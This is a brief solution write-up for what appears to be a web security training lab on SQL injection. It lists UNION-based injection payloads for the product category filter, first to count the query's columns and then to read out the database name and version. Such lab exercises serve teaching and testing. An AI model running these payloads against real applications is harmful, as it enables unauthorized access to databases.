# Lab-04 Sql Injection

## SQL Injection attack, querying the Database type and version on MySQL and Microsoft

### Problem

- This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

### Solution

- Goto => product category

- Try these ``` SQL query
'UNION SELECT NULL--+
"UNION SELECT NULL,NULL--+
```
to find the Number of column

- After that Use `UNION SELECT database(),version()--+` 

- Lab Solved!!
